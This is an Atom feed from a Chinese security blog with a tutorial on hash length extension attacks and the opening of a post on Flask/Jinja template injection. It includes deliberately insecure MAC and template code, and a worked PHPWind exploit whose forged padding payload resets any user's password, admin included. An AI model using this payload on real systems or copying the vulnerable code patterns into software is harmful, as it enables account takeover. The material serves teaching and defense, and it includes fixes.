<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Klaus&#39; blog</title>
  <subtitle>这个人比较菜.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://klaus.link/"/>
  <updated>2017-06-02T16:34:49.000Z</updated>
  <id>http://klaus.link/</id>
  
  <author>
    <name>Klaus</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Web中的密码学之哈希长度扩展攻击</title>
    <link href="http://klaus.link/2017/Hash_Length_Extension_Attacks_in_Web/"/>
    <id>http://klaus.link/2017/Hash_Length_Extension_Attacks_in_Web/</id>
    <published>2017-05-07T08:50:07.000Z</published>
    <updated>2017-06-02T16:34:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-攻击场景"><a href="#0x01-攻击场景" class="headerlink" title="0x01 攻击场景"></a>0x01 攻击场景</h2><p>哈希长度扩展攻击(Hash Length Extension Attacks)用于攻击MAC计算方式为 <code>$MAC = H($secret, $message)</code> 的情况. 其中 <code>H()</code> 为hash函数, <code>$secret</code>为保存在服务器上的秘密信息. 当这里hash函数为 <code>MD4</code> <code>MD5</code> <code>SHA-0</code> <code>SHA-1</code> <code>SHA-256</code> <code>SHA-512</code> 等基于MD结构的算法时. 我们就可以在知道 <code>$secret</code> 长度和一组 <code>$message</code> <code>$MAC</code> 的情况下构造出 <code>$message + padding + $yourmessage</code> 的hash从而绕过服务器上的某些验证.</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170511149444910318886.png" alt=""></p>
<h2 id="0x02-Message-Authentication-Code-MAC"><a href="#0x02-Message-Authentication-Code-MAC" class="headerlink" title="0x02 Message Authentication Code(MAC)"></a>0x02 Message Authentication Code(MAC)</h2><p>在密码学中, 消息认证码(MAC)用于保证消息的完整性(integrity)和真实性(authenticity).</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170511149444648852381.png" alt=""></p>
<p>(图片来自维基百科)</p>
<p>上图展示了通过MAC认证消息的过程, 可以看得出MAC是通过MAC算法, 密钥和消息三者生成的, 但通常情况下常用MD5, SHA等hash算法来作MAC算法, 也就是文章开头的<code>$H()</code>.  Web中常见的情况是服务器充当上图中的两者, 服务器对认证过的请求计算一次MAC传递给用户, 所以在服务器端只要验证用户提交的MAC与计算出的请求的MAC是否相等, 就能判别用户的请求是否合法.  </p>
<h2 id="0x03-Merkle–Damgard-MD-结构"><a href="#0x03-Merkle–Damgard-MD-结构" class="headerlink" title="0x03 Merkle–Damgård(MD)结构"></a>0x03 Merkle–Damgård(MD)结构</h2><p>由于现在很多Web服务中使用基于MD结构的hash函数作为MAC算法, 所以这就不可避免地引入了哈希长度扩展攻击的风险.</p>
<p>在进行哈希长度拓展攻击之前, 我们先要了解一下什么是MD结构.</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170509149430208341796.png" alt=""></p>
<p>(图片来自维基百科)</p>
<p>如上图, MD算法简单来说有以下几步:</p>
<pre><code>1. 首先把要加密的消息按照固定的长度分成若干个块, 对最后一个块进行长度补足
2. 将第一个消息块和一个初始化向量IV(与具体的算法与实现有关)做一个复杂的运算f得出一个结果
3. 将上面的结果作为下一次运算f的输入向量, 并与下一个消息块进行复杂运算f, 以此类推
4. 将最后一个消息块运算后的结果进行一些处理(常是压缩函数)得出最后的结果.
</code></pre><p>明白的MD算法的流程, 我们就会想到这样一个问题: <strong>如果我们可以获得一段消息最终的hash, 那我们就可以在原消息后面附加任意的数据并计算出同样合法的hash.</strong>  因为每一次运算只依赖上一次的结果, 与之前的运算没有关联.</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170511149444930323285.png" alt=""></p>
<h2 id="0x04-构造扩展消息"><a href="#0x04-构造扩展消息" class="headerlink" title="0x04 构造扩展消息"></a>0x04 构造扩展消息</h2><p>下面就让我们以下面这段代码为例, 来构造恶意的扩展消息绕过服务器端的逻辑</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$secret = <span class="string">'ABCDEFG'</span>;</div><div class="line">	<span class="keyword">if</span>(!(<span class="keyword">isset</span>($_GET[<span class="string">'mac'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'request'</span>])))&#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">"error"</span>);</div><div class="line">	&#125;</div><div class="line">	$mac = $_GET[<span class="string">'mac'</span>];</div><div class="line">	$message = $_GET[<span class="string">'request'</span>];</div><div class="line">	<span class="keyword">if</span>($mac === md5($secret . $message))&#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">"success"</span>);</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>在构造消息之前, 我们还要了解一下MD5, MD5算法简单来说一共有三步:</p>
<pre><code>1. 补位
2. 补长度
3. 计算消息摘要
</code></pre><p>首先MD5要求消息长度必须符合满足 N ≡ 448 (mod 512), 即N % 512 = 448. 不足448的需要用<code>1</code>后面加<code>0</code>来补足448比特, 但是需要注意的是MD5补位的范围为 1~512, 所以补位操作是必须的, 即使原始消息长度正好满足条件, 也要补位512比特. 补位完成后, 还要在补位过消息后面附加64比特的长度信息. 长度紧随其后, 之后的比特用0填充.</p>
<p>下面来演示一下如何构造MD5的扩展消息</p>
<p>假设我们有消息<code>I am Bob</code>, 那么实际在服务器端被MD5计算的数据是:</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170526149580546667473.png" alt=""></p>
<p>图中红色的部分为服务器端合成的消息(即<code>$secret + $message</code>), 绿色部分为用<code>1</code>加上<code>0</code>的填充部分(8个bit一个字节, 所以10000000  0000……..在16进制编辑器中为80 00 00 ……..), 蓝色部分为补位消息后附加的长度信息, 补位前消息为15个字节, 120比特, 转换成16进制为0x78.</p>
<p>我们计算一下<code>ABCDEFGI am Bob</code>的MD5</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170527149588029850437.png" alt="20170527149588029850437.png"></p>
<p>根据前面所说的MD算法的特点, 每个数据块的计算只依赖与上一个数据块计算的结果, 那么现在我们已经知道了第一个数据块, 计算的结果, 那么我们直接再该数据块后附加数据就可以继续该计算, 比如我们在<strong>第一个消息块后面</strong>附加消息<code>I am Alice</code>, 如下图所示</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170527149582098731533.png" alt="20170527149582098731533.png"></p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170526149580977387060.png" alt="20170526149580977387060.png"></p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170527149582084539914.png" alt="20170527149582084539914.png"></p>
<p><img src="http://ony7wielg.bkt.clouddn.com/2017052714958763895206.png" alt="2017052714958763895206.png"></p>
<p>(图中箭头上的值并不是实际算法中直接代入下一轮计算中的值, 我们无需关心计算细节, 这里只是想表达每一轮计算产生的hash值是下一轮计算的输入; 最左边的ABCD为MD5算法固定的初始化向量)</p>
<p>我们要注意的很关键的一点是这里的附加消息是附加在第一个消息块后面, 也就是要保证我们附加的消息在下一个消息块开头(这就是为什么我们必须知道服务器端<code>$secret</code>长度的原因), 这样我们才能利用上一个消息块计算的结果去继续计算.</p>
<p>现在我们根据已有的消息<code>I am Bob</code>和其摘要<code>2229cbfa1981495d6fb63a854461b923</code>自己构造了一段消息</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170527149582070129760.png" alt="20170527149582070129760.png"></p>
<p>并能在不知道<code>$secret</code>的情况下计算出上面这段消息的hash.</p>
<p>好吧该怎么计算呢, 其实我们只需要把MD5固定的初始化向量<code>A=0x67452301;B=0xefcdab89;C=0x98badcfe;D=0x10325476</code>换成上一次计算的hash<code>2229cbfa1981495d6fb63a854461b923</code>, 然后计算我们附加数据补位完成的数据块就好了. </p>
<p>我们这里不关心具体算法的细节, 下面介绍一个工具来帮我们完成实际的计算</p>
<h2 id="0x05-利器Hashpump"><a href="#0x05-利器Hashpump" class="headerlink" title="0x05 利器Hashpump"></a>0x05 利器Hashpump</h2><p>hashpump是一个C++编写的用于哈希长度拓展攻击的工具, 支持CRC32, MD5, SHA1等等多种算法, 并且使用起来也非常方便.(python也有hashpump的库)</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/2017052714958780923117.png" alt="2017052714958780923117.png"></p>
<p>一共4个参数, 分别是<code>-s</code> 已知消息在服务器端生成的hash, <code>-d</code>已知的消息, <code>-a</code>想要附加的数据, <code>-k</code>服务器端<code>$secret</code>的长度. 我们用hashpump来计算一下我们上面构造的扩展消息的hash</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170527149587893956727.png" alt="20170527149587893956727.png"></p>
<p>输出有两行, 第一行是扩展消息的hash, 第二行是hashpump帮助我们构造的扩展消息. </p>
<p>现在我们在本地计算一下<code>$secret</code> 加上我们构造的扩展消息的MD5值</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170527149588067676540.png" alt="20170527149588067676540.png"></p>
<p>与hashpump计算出来的完全一样! 现在我们再那这对扩展消息和hash去验证前面给的那段php代码</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149608754413815.png" alt="20170530149608754413815.png"></p>
<p>成功绕过了验证. </p>
<h2 id="0x06-PHPWind哈希长度扩展漏洞"><a href="#0x06-PHPWind哈希长度扩展漏洞" class="headerlink" title="0x06 PHPWind哈希长度扩展漏洞"></a>0x06 PHPWind哈希长度扩展漏洞</h2><p>也许有的同学要问了, 前面的攻击虽然能达成, 但是我们能构造的消息必须是 <code>message + padding + attention</code> 这种形式, 未免限制太大了. 然而, 就是这种形式的构造数据再某些特定的场合下就是能利用. 下面就来举一个PHPWind的例子.</p>
<p>我们新注册一个test用户, 问题出现在用户上传头像的地方</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149607868774050.png" alt="20170530149607868774050.png"></p>
<p>我们打开网页的源代码看到上传头像的源代码里有这么一段</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149607984047530.png" alt="20170530149607984047530.png"></p>
<p>网页生成了一段URL, 而这段URL里面有用于认证请求合法性的windidkey参数 7967c3eef8e0544fc7e91e686589636b</p>
<p>我们先找到生成这段URL的PHP代码</p>
<p>src/windid/service/user/srv/WindidUserService.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showFlash</span><span class="params">($uid, $appId, $appKey, $getHtml = <span class="number">1</span>)</span> </span>&#123;</div><div class="line">		$time = Pw::getTime();</div><div class="line">		$key = WindidUtility::appKey($appId, $time, $appKey, <span class="keyword">array</span>(<span class="string">'uid'</span>=&gt;$uid, <span class="string">'type'</span>=&gt;<span class="string">'flash'</span>), <span class="keyword">array</span>(<span class="string">'uid'</span>=&gt;<span class="string">'undefined'</span>));</div><div class="line">		$key2 = WindidUtility::appKey($appId, $time, $appKey, <span class="keyword">array</span>(<span class="string">'uid'</span>=&gt;$uid, <span class="string">'type'</span>=&gt;<span class="string">'normal'</span>), <span class="keyword">array</span>());</div><div class="line">		</div><div class="line">		$postUrl = <span class="string">"postAction=ra_postAction&amp;redirectURL=/&amp;requestURL="</span> . urlencode(Wekit::app(<span class="string">'windid'</span>)-&gt;url-&gt;base . <span class="string">"/index.php?m=api&amp;c=avatar&amp;a=doAvatar&amp;uid="</span> . $uid . <span class="string">'&amp;windidkey='</span> . $key . <span class="string">'&amp;time='</span> . $time . <span class="string">'&amp;clientid='</span> . $appId . <span class="string">'&amp;type=flash'</span>) . <span class="string">'&amp;avatar='</span> . urlencode(<span class="keyword">$this</span>-&gt;getAvatar($uid, <span class="string">'big'</span>) . <span class="string">'?r='</span> . rand(<span class="number">1</span>,<span class="number">99999</span>));</div><div class="line">		<span class="keyword">return</span> $getHtml ? <span class="string">'&lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="700" height="430" id="rainbow" align="middle"&gt;</span></div><div class="line">							&lt;param name="movie" value="' . Wekit::app(<span class="string">'windid'</span>)-&gt;url-&gt;res . <span class="string">'swf/avatar/avatar.swf?'</span> . rand(<span class="number">0</span>,<span class="number">9999</span>) . <span class="string">'" /&gt;</span></div><div class="line">							&lt;param name="quality" value="high" /&gt;</div><div class="line">							&lt;param name="bgcolor" value="#ffffff" /&gt;</div><div class="line">							&lt;param name="play" value="true" /&gt;</div><div class="line">							&lt;param name="loop" value="true" /&gt;</div><div class="line">							&lt;param name="wmode" value="opaque" /&gt;</div><div class="line">							&lt;param name="scale" value="showall" /&gt;</div><div class="line">							&lt;param name="menu" value="true" /&gt;</div><div class="line">							&lt;param name="devicefont" value="false" /&gt;</div><div class="line">							&lt;param name="salign" value="" /&gt;</div><div class="line">							&lt;param name="allowScriptAccess" value="never" /&gt;</div><div class="line">							&lt;param name="FlashVars" value="' . $postUrl . <span class="string">'"/&gt;</span></div><div class="line">							&lt;embed src="' . Wekit::app(<span class="string">'windid'</span>)-&gt;url-&gt;res . <span class="string">'swf/avatar/avatar.swf?'</span> . rand(<span class="number">0</span>,<span class="number">9999</span>) . <span class="string">'" quality="high" bgcolor="#ffffff" width="700" height="430" name="mycamera" align="middle" allowScriptAccess="never" allowFullScreen="false" scale="exactfit"  wmode="transparent" FlashVars="'</span> . $postUrl . <span class="string">'" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" /&gt;</span></div><div class="line">						&lt;/object&gt;'</div><div class="line">		               : <span class="keyword">array</span>(</div><div class="line">		                    <span class="string">'width'</span> =&gt; <span class="string">'500'</span>,</div><div class="line">		                    <span class="string">'height'</span> =&gt; <span class="string">'405'</span>,</div><div class="line">		                    <span class="string">'id'</span> =&gt; <span class="string">'uploadAvatar'</span>,</div><div class="line">		                    <span class="string">'name'</span> =&gt; <span class="string">'uploadAvatar'</span>,</div><div class="line">		                    <span class="string">'src'</span> =&gt; Wekit::app(<span class="string">'windid'</span>)-&gt;url-&gt;res . <span class="string">'swf/avatar/avatar.swf'</span>,</div><div class="line">		                    <span class="string">'wmode'</span> =&gt; <span class="string">'transparent'</span>,</div><div class="line">		                    <span class="string">'postUrl'</span> =&gt; Wekit::app(<span class="string">'windid'</span>)-&gt;url-&gt;base . <span class="string">"/index.php?m=api&amp;c=avatar&amp;a=doAvatar&amp;uid="</span> . $uid . <span class="string">'&amp;windidkey='</span> . $key2 . <span class="string">'&amp;time='</span> . $time . <span class="string">'&amp;clientid='</span> . $appId . <span class="string">'&amp;type=normal&amp;jcallback=avatarNormal'</span>,</div><div class="line">		               		<span class="string">'token'</span> =&gt; $key2,</div><div class="line">		                );</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看到URL里面的key是WindidUtility::appKey这个方法生成的, 我们跟踪到这个方法</p>
<p>src/windid/service/base/WindidUtility.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">appKey</span><span class="params">($apiId, $time, $secretkey, $get, $post)</span> </span>&#123;</div><div class="line">		$array = <span class="keyword">array</span>(<span class="string">'m'</span>, <span class="string">'c'</span>, <span class="string">'a'</span>, <span class="string">'windidkey'</span>, <span class="string">'clientid'</span>, <span class="string">'time'</span>, <span class="string">'_json'</span>, <span class="string">'jcallback'</span>, <span class="string">'csrf_token'</span>, <span class="string">'Filename'</span>, <span class="string">'Upload'</span>, <span class="string">'token'</span>);</div><div class="line">		$str = <span class="string">''</span>;</div><div class="line">		ksort($get);</div><div class="line">		ksort($post);</div><div class="line">		<span class="keyword">foreach</span> ($get <span class="keyword">AS</span> $k=&gt;$v) &#123;</div><div class="line">			<span class="keyword">if</span> (in_array($k, $array)) <span class="keyword">continue</span>;</div><div class="line">			$str .=$k.$v;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">foreach</span> ($post <span class="keyword">AS</span> $k=&gt;$v) &#123;</div><div class="line">			<span class="keyword">if</span> (in_array($k, $array)) <span class="keyword">continue</span>;</div><div class="line">			$str .=$k.$v;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> md5(md5($apiId.<span class="string">'||'</span>.$secretkey).$time.$str);</div><div class="line">		</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>看到这里就很明显了, 这个方法生成windidkey的方式就是 <code>md5(md5($apiId.&#39;||&#39;.$secretkey).$time.$str)</code>, <code>$time</code> 是当前的时间, <code>$str</code> 是将 <code>$get</code> 和 <code>$post</code> 中的值排序后拼接起来, <code>md5($apiId.&#39;||&#39;.$secretkey)</code>的长度是固定的32位, 而 <code>$time</code> 和 <code>$str</code> 又是我们可控的, 我们完全可以按照前面的方法构造新的请求并绕过windidkey的验证! 下面我们看一下具体验证请求的地方</p>
<p>src/applications/windidserver/api/controller/OpenBaseController.php </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">beforeAction</span><span class="params">($handlerAdapter)</span> </span>&#123;</div><div class="line">		<span class="keyword">parent</span>::beforeAction($handlerAdapter);</div><div class="line">		$charset = <span class="string">'utf-8'</span>;</div><div class="line">		$_windidkey = <span class="keyword">$this</span>-&gt;getInput(<span class="string">'windidkey'</span>, <span class="string">'get'</span>);</div><div class="line">		$_time = (int)<span class="keyword">$this</span>-&gt;getInput(<span class="string">'time'</span>, <span class="string">'get'</span>);</div><div class="line">		$_clientid = (int)<span class="keyword">$this</span>-&gt;getInput(<span class="string">'clientid'</span>, <span class="string">'get'</span>);</div><div class="line">		<span class="keyword">if</span> (!$_time || !$_clientid) <span class="keyword">$this</span>-&gt;output(WindidError::FAIL);</div><div class="line">		$clent = <span class="keyword">$this</span>-&gt;_getAppDs()-&gt;getApp($_clientid);</div><div class="line">		<span class="keyword">if</span> (!$clent) <span class="keyword">$this</span>-&gt;output(WindidError::FAIL);</div><div class="line">		<span class="keyword">if</span> (WindidUtility::appKey($clent[<span class="string">'id'</span>], $_time, $clent[<span class="string">'secretkey'</span>], <span class="keyword">$this</span>-&gt;getRequest()-&gt;getGet(<span class="keyword">null</span>), <span class="keyword">$this</span>-&gt;getRequest()-&gt;getPost()) != $_windidkey)  <span class="keyword">$this</span>-&gt;output(WindidError::FAIL);</div><div class="line">		</div><div class="line">		$time = Pw::getTime();</div><div class="line">		<span class="keyword">if</span> ($time - $_time &gt; <span class="number">1200</span>) <span class="keyword">$this</span>-&gt;output(WindidError::TIMEOUT);</div><div class="line">		<span class="keyword">$this</span>-&gt;appid = $_clientid;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>绕过了这个函数的验证就可以访问PHPWind中的API, 函数的逻辑很简单, 必须有 <code>clientid</code> 和 <code>time</code> 这两个参数, 验证提交的windidkey与WindidUtility::appKey中计算的结果是否一致, 之后如果对请求生成的windidkey没有超时就返回成功.</p>
<p>我们只要能使请求 <code>POST a=editUser&amp;c=user&amp;m=api&amp;uid=2&amp;password=aaabbbcc</code>  通过windidkey的校验就可以将uid为2的用户的密码更改为aaabbbccc</p>
<p>我们回过头来看生成上传头像处URL的代码, 传入appKey方法中的 <code>$get</code>, <code>$post</code> 参数实际上是两个数组</p>
<p> <code>array(&#39;uid&#39;=&gt;$uid, &#39;type&#39;=&gt;&#39;flash&#39;)</code> 和 <code>array(&#39;uid&#39;=&gt;&#39;undefined&#39;)</code> 也就是说上图中的windidkey实际上是 <code>md5($apiId.&#39;||&#39;.$secretkey) + &quot;1496078639&quot; + &quot;typeflashuid2uidundefined&quot;</code> 的MD5值.</p>
<p>验证API请求的beforeAction函数中, 传入appKey方法中的 <code>$get</code>, <code>$post</code> 参数是实际请求URL中的参数, 需要注意的一点是appKey方法还会对去掉存在于数组 <code>array(&#39;m&#39;, &#39;c&#39;, &#39;a&#39;, &#39;windidkey&#39;, &#39;clientid&#39;, &#39;time&#39;, &#39;_json&#39;, &#39;jcallback&#39;, &#39;csrf_token&#39;, &#39;Filename&#39;, &#39;Upload&#39;, &#39;token&#39;)</code> 中的键. 也就是说我们想构造的请求中只有uid和password两个参数参与. 所以我们需要附加的消息就是passwordaaabbbcccuid2</p>
<p>好啦, 根据我们前面的方法直接上hashpump</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149608322678645.png" alt="20170530149608322678645.png"></p>
<p>这里有个问题, 就是我们怎样让b<code>typeflashuid2uidundefined%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%18%02%00%00%00%00%00%00</code> </p>
<p>参与到windidkey的计算中来, 因为我们用计算出的hash是整个消息</p>
<p><code>1496078639typeflashuid2uidundefined%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%18%02%00%00%00%00%00%00passwordaaabbbcccuid2</code> </p>
<p>的hash. 这里有个技巧, 同时也是我认为这个洞很关键的一点, 就是我们可以传一个参数</p>
<p><code>typeflashuid2uidundefined=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%18%02%00%00%00%00%00%00</code></p>
<p>虽然这个参数是没有功能上的作用的, 但是它还是要被后端的PHP收到, 这样经过appKey方法排序拼接过后, 被计算的消息就变成了</p>
<p><code>1496078639typeflashuid2uidundefined%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%18%02%00%00%00%00%00%00passwordaaabbbcccuid2</code></p>
<p>再附上hashpump计算出来的hash我们成功构造请求, 绕过了验证</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149608409049699.png" alt="20170530149608409049699.png"></p>
<p>这样我们就已经将uid为2的用户的密码修改为aaabbbccc了, 通过这种方式我们可以修改数据库中任意用户的密码, 包括管理员的. 其实这个洞不单单是能够修改密码, 通过构造不同的参数可以访问PHPWind的API中不同的逻辑. 不过那不是本文的重点了, 大家自行探究. </p>
<p>这个洞和原来Flicker那个洞非常类似, 都是通过计算拼接后参数的MAC来验证API请求的合法性. 然而利用哈希长度扩展攻击和URL参数的这个特性就可以伪造合法的请求.</p>
<h2 id="0x07-修补方案和反思"><a href="#0x07-修补方案和反思" class="headerlink" title="0x07 修补方案和反思"></a>0x07 修补方案和反思</h2><p>采用MD算法的哈希函数都无法避免扩展攻击. 对于这种问题, 最好的一个解决方案就是使用将MAC算法改为HMAC算法, 即 <code>H($secret + H($secret + $message))</code> 这样子的话, 一来 <code>hash($secret + $message)</code> 内容是不可控的, 二来其长度也是固定的, 自然也没办法扩展了. 另外如果把 <code>$secret</code> 放在后面 <code>H($message + $secret)</code>, 这样我们也是没有办法做扩展攻击的.  </p>
<p>其实想一想上面PHPWind的例子, 我们已知的消息是t开头的, 如果说我们构造的请求中在GET里有一个a开头的参数(比如app_id)那经过上面那样排序以后不可避免地app_id会落在我们t开头的消息前面, 那么这种请求实际上我们也是无法做扩展攻击的. </p>
<h1 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h1><p><a href="https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction" target="_blank" rel="external">https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction</a></p>
<p><a href="http://netifera.com/research/flickr_api_signature_forgery.pdf" target="_blank" rel="external">http://netifera.com/research/flickr_api_signature_forgery.pdf</a></p>
<p><a href="http://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="external">http://blog.csdn.net/syh_486_007/article/details/51228628</a></p>
<p><a href="http://netsecurity.51cto.com/art/201609/517646.htm" target="_blank" rel="external">http://netsecurity.51cto.com/art/201609/517646.htm</a></p>
<p><a href="http://blog.nsfocus.net/phpwind-hash-length-attack-hashpump-getshell/" target="_blank" rel="external">http://blog.nsfocus.net/phpwind-hash-length-attack-hashpump-getshell/</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/phpwind-hash-length-extension-attack.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/phpwind-hash-length-extension-attack.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-攻击场景&quot;&gt;&lt;a href=&quot;#0x01-攻击场景&quot; class=&quot;headerlink&quot; title=&quot;0x01 攻击场景&quot;&gt;&lt;/a&gt;0x01 攻击场景&lt;/h2&gt;&lt;p&gt;哈希长度扩展攻击(Hash Length Extension Attacks)用于攻
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Flask/Jinja 模板注入</title>
    <link href="http://klaus.link/2017/Flask_SSTI/"/>
    <id>http://klaus.link/2017/Flask_SSTI/</id>
    <published>2017-04-05T18:27:50.000Z</published>
    <updated>2017-05-30T18:51:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>最近看了国外几篇关于模板注入的文章, 自己也在这里加上自己的一些东西总结一下.  </p>
<blockquote>
<p><a href="http://blog.portswigger.net/2015/08/server-side-template-injection.html" target="_blank" rel="external">Server-Side Template Injection</a> — <a href="https://twitter.com/albinowax" target="_blank" rel="external">James Kettle</a></p>
<p><a href="http://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/" target="_blank" rel="external">Exploring SSTI in Flask/Jinja2</a> —  <a href="https://nvisium.com/about#TimTomes" target="_blank" rel="external">Tim Tomes</a></p>
<p><a href="https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/" target="_blank" rel="external">Exploring SSTI in Flask/Jinja2, Part II</a> — <a href="https://nvisium.com/about#TimTomes" target="_blank" rel="external">Tim Tomes</a></p>
</blockquote>
<h1 id="0x01-万恶的拼接"><a href="#0x01-万恶的拼接" class="headerlink" title="0x01 万恶的拼接"></a>0x01 万恶的拼接</h1><p>我们先看这段处理网站404状态的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.errorhandler(404)</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(e)</span>:</span></div><div class="line">    template = <span class="string">'''</span></div><div class="line">&#123;%% block body %%&#125;</div><div class="line">    &lt;div class="center-content error"&gt;</div><div class="line">        &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt;</div><div class="line">        &lt;h3&gt;%s&lt;/h3&gt;</div><div class="line">    &lt;/div&gt; </div><div class="line">&#123;%% endblock %%&#125;</div><div class="line">''' % (request.url)</div><div class="line">    <span class="keyword">return</span> render_template_string(template), <span class="number">404</span></div></pre></td></tr></table></figure>
<p>这段代码没有从模板文件而是用 render_template_string() 直接从一个字符串渲染到了html. 从模板文件还是从字符串倒不是什么大问题, 主要是它渲染的那个字符串是和用户的输入(request.url)拼接过的. 要知道这里的 template 存的并不是纯数据而是有一部分控制功能在里面的. 这就产生了代码域与数据域的混淆, 只要出现了这样的情况十有八九就会有洞. 首先最直接的, html模板渲染到html, 插入到html就肯定会有XSS.</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149609702857674.png" alt="20170530149609702857674.png"></p>
<h1 id="0x02-不仅仅是客户端"><a href="#0x02-不仅仅是客户端" class="headerlink" title="0x02 不仅仅是客户端"></a>0x02 不仅仅是客户端</h1><p>我们都知道html里面拼接数据是XSS攻击的是客户端, 然而html模板并不仅仅是html, 还有能被模板渲染引擎解释的模板代码, 这样一来我们就能插入在服务器端执行的代码. 让我们试一下</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170530149609767354923.png" alt="20170530149609767354923.png"></p>
<p>看来是可以的, 再试一个 <code></code> </p>
